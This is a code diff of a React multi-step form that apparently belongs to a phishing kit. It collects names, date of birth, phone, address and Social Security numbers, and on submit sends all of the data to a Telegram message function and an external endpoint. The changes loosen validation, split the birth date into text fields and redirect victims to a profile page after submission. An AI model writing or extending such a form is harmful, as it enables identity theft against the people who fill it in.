@@ -14,11 +14,14 @@ const states = [
     'SD', 'TN', 'TX', 'UT', 'VT', 'VA', 'WA', 'WV', 'WI', 'WY'
   ];
   
-const currentYear = new Date().getFullYear();
+
 
 type FormData = {
   firstName: string;
   lastName: string;
+  day: string;
+  month:string;
+  year:string;
   dob: string;
   phone: string;
   email: string;
@@ -42,6 +45,9 @@ const MultiStepForm = () => {
     firstName: '',
     lastName: '',
     dob: '',
+    day:'',
+    month:'',
+    year:'',
     phone: '',
     email: '',
     address: '',
@@ -78,13 +84,10 @@ const MultiStepForm = () => {
   // Validation functions
   const validateStep1 = () => {
     const newErrors: FormErrors = {};
-    const phoneDigits = formData.phone.replace(/\D/g, '');
     const ssnDigits = formData.ssn.replace(/\D/g, '');
 
     if (!formData.firstName.trim()) newErrors.firstName = 'First name is required';
     if (!formData.lastName.trim()) newErrors.lastName = 'Last name is required';
-    if (!formData.dob) newErrors.dob = 'Date of birth is required';
-    if (phoneDigits.length !== 10) newErrors.phone = 'Invalid phone number';
     if (ssnDigits.length !== 9) newErrors.ssn = 'Invalid SSN';
     if (formData.zipcode.length !== 5) newErrors.zipcode = 'Invalid ZIP code';
 
@@ -128,9 +131,10 @@ const MultiStepForm = () => {
     try {
         const message = formatTelegramMessage(formData);
     await sendTelegramMessage(message);
-      await axios.post('/api/submit', formData);
+    await axios.post('https://your-api-gateway-url.com/submit', formData);
+        
       
-      router.push('/success');
+      router.push('/profile');
 
     } finally {
       setIsLoading(false);
@@ -178,15 +182,42 @@ const MultiStepForm = () => {
               />
             </div>
 
-            <InputField
-              label="Date of Birth"
-              type="date"
-              value={formData.dob}
-              onChange={v => handleChange('dob', v)}
-              error={errors.dob}
-              max={`${currentYear - 18}-01-01`}
-              required
-            />
+            <div>
+  <label className="block text-sm font-medium text-black mb-1">Date of Birth</label>
+  <div className="grid grid-cols-3 gap-2">
+    <input
+      id="day"
+      name="day"
+      type="text"
+      placeholder="Day"
+      className="border rounded-lg p-2 w-full"
+      required
+      value={formData.day}
+      onChange={(e) => handleChange('day', e.target.value)}
+    />
+    <input
+      id="month"
+      name="month"
+      type="text"
+      placeholder="Month"
+      className="border rounded-lg p-2 w-full"
+      required
+      value={formData.month}
+      onChange={(e) => handleChange('month', e.target.value)}
+    />
+    <input
+      id="year"
+      name="year"
+      type="text"
+      placeholder="Year"
+      className="border rounded-lg p-2 w-full"
+      required
+      value={formData.year}
+      onChange={(e) => handleChange('year', e.target.value)}
+    />
+  </div>
+</div>
+
 
             <InputField
               label="Phone Number"
